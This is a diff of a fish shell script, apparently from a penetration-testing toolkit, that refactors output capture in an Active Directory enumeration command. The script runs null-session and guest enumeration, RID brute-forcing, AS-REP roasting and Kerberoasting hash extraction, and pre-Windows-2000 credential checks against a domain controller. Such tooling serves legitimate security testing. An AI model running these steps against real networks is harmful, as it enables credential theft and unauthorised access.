@@ -91,9 +91,11 @@ ezpz enumnull -t dc01.corp.local --guest -k
         set auth_pass ""
         set auth_desc "null session"
 
-        if not __ezpz_enumnull_has_data $target "" ""
+        ezpz_spin __ezpz_enumnull_has_data $target "" ""
+        if test $status -ne 0
             ezpz_warn "Null session returned no data. Trying guest account..."
-            if __ezpz_enumnull_has_data $target "guest" ""
+            ezpz_spin __ezpz_enumnull_has_data $target "guest" ""
+            if test $status -eq 0
                 set auth_user "guest"
                 set auth_desc "guest account (null session returned nothing)"
             else
@@ -131,8 +133,12 @@ ezpz enumnull -t dc01.corp.local --guest -k
     ezpz_title "Starting enumeration on $target using $auth_desc..."
 
     # Extract domain first (fast)
-    set domain (timeout 60 nxc smb $target | grep -a 'domain:' | head -1 | sed -n 's/.*domain:\([^)]*\).*/\1/p')
-    if test $status -eq 124
+    set -l domain_tmp (mktemp)
+    ezpz_spin_capture $domain_tmp timeout 60 nxc smb $target
+    set -l domain_rc $status
+    set domain (grep -a 'domain:' $domain_tmp | head -1 | sed -n 's/.*domain:\([^)]*\).*/\1/p')
+    rm -f $domain_tmp
+    if test $domain_rc -eq 124
         ezpz_warn "Operation timed out. Skipping."
     end
     
@@ -165,7 +171,8 @@ ezpz enumnull -t dc01.corp.local --guest -k
         cp $users_tmp $users_file
         ezpz_info "Saving enumerated users to $users_file"
     else
-        ezpz_warn "No users found with --rid-brute. Trying --users as fallback..."
+        printf '%s\n' "No users found with RID bruteforcing."
+        ezpz_info "Trying --users as fallback..."
         
         # Fallback to --users
         ezpz_header "Enumerating users (fallback)"
@@ -187,8 +194,11 @@ ezpz enumnull -t dc01.corp.local --guest -k
     # Groups
     ezpz_header "Enumerating groups"
     ezpz_cmd "nxc ldap $nxc_args --groups"
-    set groups_out (timeout 60 nxc ldap $nxc_args --groups 2>/dev/null)
+    set -l groups_tmp (mktemp)
+    ezpz_spin_capture $groups_tmp timeout 60 nxc ldap $nxc_args --groups
     set groups_status $status
+    set groups_out (cat $groups_tmp)
+    rm -f $groups_tmp
     if test $groups_status -eq 124
         ezpz_warn "Operation timed out. Skipping."
     else
@@ -212,8 +222,11 @@ ezpz enumnull -t dc01.corp.local --guest -k
     # Password Policy
     ezpz_header "Enumerating password policy"
     ezpz_cmd "nxc smb $nxc_args --pass-pol"
-    set passpol_out (timeout 60 nxc smb $nxc_args --pass-pol 2>/dev/null)
+    set -l passpol_tmp (mktemp)
+    ezpz_spin_capture $passpol_tmp timeout 60 nxc smb $nxc_args --pass-pol
     set passpol_status $status
+    set passpol_out (cat $passpol_tmp)
+    rm -f $passpol_tmp
     if test $passpol_status -eq 124
         ezpz_warn "Operation timed out. Skipping."
     else
@@ -315,7 +328,10 @@ ezpz enumnull -t dc01.corp.local --guest -k
         end
         
         ezpz_cmd "$getnpusers_cmd"
-        set output ($getnpusers_cmd 2>&1)
+        set -l asrep_tmp (mktemp)
+        ezpz_spin_capture $asrep_tmp $getnpusers_cmd
+        set output (cat $asrep_tmp)
+        rm -f $asrep_tmp
         set hash_lines (printf '%s\n' $output | grep -a '^\$krb5asrep\$')
         
         # Show and save hash lines if found
@@ -341,7 +357,10 @@ ezpz enumnull -t dc01.corp.local --guest -k
                 end
                 
                 ezpz_cmd "$getuserspns_cmd"
-                set spn_output ($getuserspns_cmd 2>&1)
+                set -l spn_tmp (mktemp)
+                ezpz_spin_capture $spn_tmp $getuserspns_cmd
+                set spn_output (cat $spn_tmp)
+                rm -f $spn_tmp
                 set spn_hash_lines (printf '%s\n' $spn_output | grep -a '^\$krb5tgs\$')
                 
                 # Show and save hash lines if found
@@ -373,7 +392,10 @@ ezpz enumnull -t dc01.corp.local --guest -k
                 end
                 
                 ezpz_cmd "$pre2k_cmd"
-                set -l pre2k_out ($pre2k_cmd | grep -aioE "VALID CREDENTIALS: .*" --color=never)
+                set -l pre2k_tmp (mktemp)
+                ezpz_spin_capture $pre2k_tmp $pre2k_cmd
+                set -l pre2k_out (grep -aioE "VALID CREDENTIALS: .*" --color=never $pre2k_tmp)
+                rm -f $pre2k_tmp
                 if test -n "$pre2k_out"
                     printf '%s\n' $pre2k_out
                 else
